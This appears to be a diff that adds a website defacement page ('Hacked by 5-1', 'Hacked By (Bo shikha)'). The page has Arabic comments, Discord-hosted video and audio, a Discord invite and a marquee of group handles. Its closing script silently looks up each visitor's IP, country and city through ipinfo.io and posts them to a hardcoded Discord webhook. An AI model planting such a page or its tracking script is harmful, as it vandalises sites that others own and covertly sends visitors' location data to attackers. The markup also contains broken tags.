@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Hacked by 5-1">
+  <meta http-equiv="cache-control" content="index,cache">
+  <meta http-equiv="pragma" content="index,cache">
+  <title>ҳ̸Ҳ̸ҳ 5-1 ҳ̸Ҳ̸ҳ</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: black; /* خلفية سوداء */
+      font-family: 'monospace';
+      flex-direction: column; /* لمحاذاة المحتوى عمودياً */
+    }
+    .bg-video {
+      width: 60%; /* ضبط عرض الفيديو */
+      height: auto; /* الحفاظ على نسبة العرض إلى الارتفاع */
+      z-index: 1;
+    }
+    .content {
+      color: white;
+      text-align: center;
+      z-index: 2;
+      margin-top: 20px; /* لإضافة مسافة بين الفيديو والنص */
+    }
+    h1, p, font, marquee, #clock {
+      text-shadow: 0 0 4px rgba(0, 0, 0, 0.8);
+    }
+    a:link {
+      text-decoration: none;
+    }
+  </style>
+
+  <script>
+    function playSound() {
+      var audio = document.querySelector("audio");
+      audio.play();
+    }
+
+    async function fetchIP() {
+      try {
+        let response = await fetch('https://api.ipify.org?format=json');
+        let data = await response.json();
+        let ip = data.ip;
+        document.getElementById('ip-address').innerHTML = 'IP: ' + ip;
+      } catch (error) {
+        console.error('Error fetching IP address:', error);
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', fetchIP);
+  </script>
+</head>
+
+<body onclick="playSound()" onmouseover="playSound()">
+  <!-- فيديو في الوسط -->
+  <video class="bg-video" autoplay loop muted>
+    <source src="https://cdn.discordapp.com/attachments/1276895317002031188/1291759923927191583/Recording_2024-09-29_175440.mp4?ex=672828ed&is=6726d76d&hm=c0c0b52ec846a1fbfa855bbb22fedcbd423c83142700bb2ba73b3689444ee2f3&" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+
+  <!-- الصوت الذي يتم تشغيله عند التفاعل مع الصفحة -->
+  <audio src="https://cdn.discordapp.com/attachments/1294666102714007637/1302597841012658196/mp3?ex=6728b246&is=672760c6&hm=4e9db13d1e292f4eed520ac8681d02ac4c565a02234822fd35740ad93db22d97&" loop></audio>
+
+  <!-- النص تحت الفيديو -->
+  <div class="content">
+    <h1><font color="#f30404">Hacked By (Bo shikha)</font></h1>
+    <p><font color="#c9cdd2ا</font></p>
+    <a href="https://discord.gg/205" style="font-size: 30px; color: rgb(221, 4, 4);">Discord.gg/5-1</a>
+    <div id="clock"></div>
+    <div id="ip-address" style="color:#ff0000; margin-top: 5px;">anti cheat down ! </div>
+  </div>
+
+  <script>
+    // عرض الوقت
+    function showTime() {
+      var today = new Date();
+      var hours = today.getHours();
+      var minutes = today.getMinutes();
+      var seconds = today.getSeconds();
+      var period = hours < 12 ? 'AM' : 'PM';
+
+      if (hours > 12) hours -= 12;
+      if (hours === 0) hours = 12;
+      minutes = minutes < 10 ? '0' + minutes : minutes;
+      seconds = seconds < 10 ? '0' + seconds : seconds;
+
+      
+    }
+
+    setInterval(showTime, 1000); // تحديث الساعة كل ثانية
+
+    // إرسال معلومات IP والبلد إلى الديسكورد
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        const { ip, country, city } = data;
+        const dateTime = new Date().toLocaleString();
+        const webhookUrl = 'https://canary.discord.com/api/webhooks/1272243171002155171/1VplgHFEFQeh83OCY5rmFk7cKHzmj6LjPfBsCUXcPLPSr9jQFGrO3YeTgisQeDtMM1E8';
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({content: `IP: ${ip}\nCountry & City: ${country} - ${city}\nDate & Time: ${dateTime}`})
+        });
+      });
+  </script>
+  </script>
+<marquee>
+              <font size="3">
+              Rk - relx - psyco - M7md - حكايه و انتهت - billal - 88fh
+            </marquee>
+          </div
+      </td>
+    </table>
+</body>
+</html>
